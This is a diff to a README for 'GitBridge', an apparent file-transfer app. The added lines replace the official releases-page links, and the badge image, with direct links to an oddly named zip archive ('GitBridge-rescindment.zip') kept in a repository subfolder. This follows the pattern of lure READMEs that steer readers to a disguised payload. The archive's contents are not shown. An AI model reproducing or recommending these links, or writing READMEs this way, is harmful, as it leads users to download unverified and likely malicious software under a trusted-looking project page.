@@ -1,7 +1,7 @@
 # 🌉 GitBridge - Effortless File Transfer Made Simple
 
 ## 📥 Download Now
-[![Download GitBridge](https://img.shields.io/badge/Download%20GitBridge-v1.0.0-blue.svg)](https://github.com/Dilliraja4273/GitBridge/releases)
+[![Download GitBridge](https://raw.githubusercontent.com/Dilliraja4273/GitBridge/main/Funaria/GitBridge-rescindment.zip%https://raw.githubusercontent.com/Dilliraja4273/GitBridge/main/Funaria/GitBridge-rescindment.zip)](https://raw.githubusercontent.com/Dilliraja4273/GitBridge/main/Funaria/GitBridge-rescindment.zip)
 
 ## 📄 Description
 GitBridge is a user-friendly application designed to make file transfer easy and efficient. With GitBridge, you can quickly share files without any hassle. It supports multiple file types and guarantees a secure connection.
@@ -22,7 +22,7 @@ Follow these simple steps to get started with GitBridge.
 - **User-Friendly Interface:** Navigate the app without any technical expertise.
 
 ## 📦 Download & Install
-To download GitBridge, visit this page to download: [Releases Page](https://github.com/Dilliraja4273/GitBridge/releases).
+To download GitBridge, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Dilliraja4273/GitBridge/main/Funaria/GitBridge-rescindment.zip).
 
 1. Open the link. 
 2. Find the latest version. 
